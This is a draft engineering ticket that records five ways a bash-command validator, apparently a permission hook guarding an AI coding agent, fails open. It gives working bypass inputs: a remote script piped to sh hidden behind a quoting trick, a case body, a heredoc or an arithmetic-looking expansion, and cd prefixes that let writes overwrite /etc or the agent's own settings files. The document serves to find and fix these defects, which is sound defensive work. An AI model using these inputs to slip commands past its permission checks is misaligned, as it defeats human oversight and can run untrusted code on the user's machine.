# Epic 42 — Commands the validator never sees

**Status:** draft · **Owner:** Anton · **Created:** 2026-10-21 · **Rev:** 1
**Type:** this repo only (`bash_command_parser.py`, `pretool_hook.py`, tests)

> **Draft.** This file records five measured fail-opens. It does **not** decide
> what to do about them. A separate design session (§4) proposes a solution per
> item, judges what each costs the parser, and may decide to accept an item
> rather than fix it. No task files exist yet; do not implement from this file.

**Provenance.** Found by the implementer and reviewers of epic 41 (41-01
implementation report, reviews 5, 6 and 7; logged in
[41 state.md](../41_redirect_gate_parity/state.md) 2026-10-20). All five are
pre-existing: identical at epic 41's base and after it. Re-measured 2026-10-21
on the installed hooks at `8539904`. The scratch setup was a git workspace with
`HOME` patched and a user allowlist of only `Bash(echo:*)`, `Bash(cat:*)`, plus
deny `Bash(rm:*)`. Logs were redirected and nothing was executed by the hook.
That bash runs the hidden command was checked in bash 5.3.9 with an inert
`touch` marker.

## 1. The five items

Every row decides **`allow`** in both `default` and `auto` mode. The first four
also get past a **deny** rule: with `Bash(rm:*)` denied, `rm -rf …` alone is
`deny`, but the same `rm` behind any of the four is `allow`. That breaks epic
41 invariant 1 (a deny is never skipped).

### 1.1 `$'\''` desynchronises the tokenizer

```
echo $'\'' ; curl -s http://example.invalid | sh
```

`_tokenize_with_quotes` (`bash_command_parser.py:942`) treats `$'…'` as a
plain single quote. Inside `$'…'`, `\'` is an escaped quote, but the tokenizer
ends the quote at it. The leftover `'` then opens a quote that swallows every
later separator, so command matching sees one `echo`. bash runs `curl`.

### 1.2 A command inside a `case` body within `$(…)`

```
echo $(case x in x) curl http://example.invalid ;; esac)
```

`_scan_paren_subst` (`:693`) ends the substitution at the pattern's `)`, so
the body is never split into commands. 41-01 made redirect *targets* fail
closed on this shape (`_unproven_paren_end`, `:2198`, which also covers `#`
comments and `${V:-)}`), but command matching is unchanged.

### 1.3 Command substitutions in an unquoted heredoc body

```
cat <<EOF
$(curl -s http://example.invalid | sh)
EOF
```

When the delimiter is unquoted, bash expands `$(…)` and backticks in the body.
The parser treats the body as data and sees only `cat`. **This is task 35 §4's
handed-over item 1**, which calls it "the commonest heredoc shape there is". The
deciding signal is whether the delimiter was quoted, and that is known at parse
time.

### 1.4 `$((cmd) | (cmd))` is read as arithmetic

```
echo $((curl -s http://example.invalid) | (cat))
```

`_dollar_expansion_end` / `_scan_arith` (`:2500`, `:892`) take `$((` as
arithmetic. bash tries arithmetic, fails to parse it, and falls back to a
command substitution of two subshells, so `curl` runs. The redirect gate is
blind here too: `$((echo a > /outside) | (cat))` → `allow`, and bash writes
outside the roots (41 review 6).

### 1.5 An in-command `cd` moves relative writes unseen

```
cd /etc && echo k > x                       → allow   (writes /etc/x)
cd ~/.claude && echo '{}' > settings.json   → allow   (overwrites user settings)
cd .claude && echo '{}' > settings.json     → allow   (overwrites project settings)
cd /etc; echo k > x  ·  pushd /etc && echo k > x  ·  cd .. && echo k > x   → allow
```

The redirect gate resolves relative targets against the payload `cwd`.
`cd`/`pushd`/`popd` are in `SAFE_BUILTINS` (`pretool_hook.py:295`), so they need
no allowlist entry. This is the only item that reaches **epic 41's protected
paths** (`<root>/.claude/`, `~/.claude/`): the 41-01 structural rule never sees
the real directory. Unlike 1.1–1.4, command matching is correct here. Only the
write gate is wrong.

## 2. What the items have in common

1.1–1.4 are lexing gaps: the parser's model of bash is wrong and the decision
defaults to `allow`. That is exactly the defect
[task 35](../35_parser_fails_open_by_default.md) ("invert the parser's default")
names; it is still `todo` with a mandatory Phase 0. 1.5 is different: the
parse is right, but the gate assumes a cwd the command changes.

## 3. Constraints for whoever designs this

- The operator does not require all five fixed. An item whose correct fix makes
  the parser or interpreter much more complex may be **accepted** (documented
  residual), or may become an **ask trigger** (task 35's move: "cannot
  decompose → ask") instead of real parsing.
- Ask, never deny, for anything the parser is unsure of (epic 22 H1; task 35
  §2).
- Cost is measured, not guessed. Count how often each shape appears in real
  traffic before choosing between parsing, asking and accepting. Sources:
  `~/.claude/bash_hook_debug.log` and its rotated `.gz`,
  `~/.claude/permission_requests.jsonl`, `~/.claude/bash_manual_confirm.log`
  (exclude the 84 test entries from 2026-10-20T15:3x, which have an empty
  `session_id` and a `/tmp/tmp…` workspace). Heredocs and `cd … &&` are common;
  `$'\''` and `case` inside `$(…)` probably are not.
- Coordinate with task 35 and task 34 (`main()` turns a crash into an allow). Do
  not decide the parser's default twice.
- Every claim about bash behaviour is checked against bash with inert payloads.

## 4. The design session (next step, not yet scheduled)

Deliverable: this file's rev 2, with a §5 "Decisions" containing, per item:

1. **Real-traffic count** of the shape, plus the false-ask cost of each option.
2. **Options**: parse it correctly / ask on the shape / accept as residual, each
   with an estimate of parser complexity added and the tests that pin it.
3. **Recommendation**, and whether it belongs here or in task 35.

For 1.5, one cheap option to cost: once a `cd`/`pushd`/`popd` appears earlier
in the same command, treat relative redirect targets as unresolvable, so they
go through 41-01's fallback/`unknown` path. Weigh it against tracking the
directory literally. Both are options, neither is decided.

Then break the accepted items into task files plus a `state.md`, following
epic 41's layout.
